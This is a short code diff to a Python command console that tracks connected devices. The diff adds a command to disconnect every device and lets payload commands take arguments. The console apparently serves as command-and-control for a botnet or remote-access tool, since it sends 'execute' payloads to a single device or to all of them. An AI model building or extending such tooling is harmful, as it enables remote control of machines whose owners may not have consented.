@@ -31,7 +31,15 @@ def ccmd(x):
     Arg(str, "target device"))
 def ckick(x):
     if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
-    return ds[x[0]].kill()
+    return ds[x[0]].kill("Kicked.")
+
+@cc.command(["kickdis"])
+def ckickdis(x):
+    a = {}
+    for i in ds.copy():
+        x = ds[i].kill("Kicked all.")
+        a[x] = a.get(x, 0) + 1
+    return a
 
 
 @cc.command(["paylist"],
@@ -42,16 +50,17 @@ def cpaylist(x):
 
 @cc.command(["payload", "pay"],
     Arg(str, "target device"),
-    Arg(str, "Payload."))
+    Arg(str, "Payload."),
+    Arg(str, "arguments", optional=True, multi=True))
 def cpay(x):
     if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
-    return ds[x[0]].send(Packet("execute", x[1]))
+    return ds[x[0]].send(Packet("execute", " ".join([y for y in x[1::] if y != None])))
 
 @cc.command(["paydis", "payloaddis"],
     Arg(str, "Payload."),
     Arg(str, "arguments", optional=True, multi=True))
 def cpaydis(x):
-    return ds.distribute_packet(Packet("execute", "<x>".join([y for y in x if y != None])))
+    return ds.distribute_packet(Packet("execute", " ".join([y for y in x if y != None])))
 
 @cc.command(["active"],
 Arg(str, "target device"))
@@ -85,7 +94,8 @@ def cfiledis(x):
 
 ds.start()
 while True:
-    print(cc.handleExecute(input(": ")))
+    out = cc.handleExecute(input(": "))
+    print(out)
 
 
 print(cc)
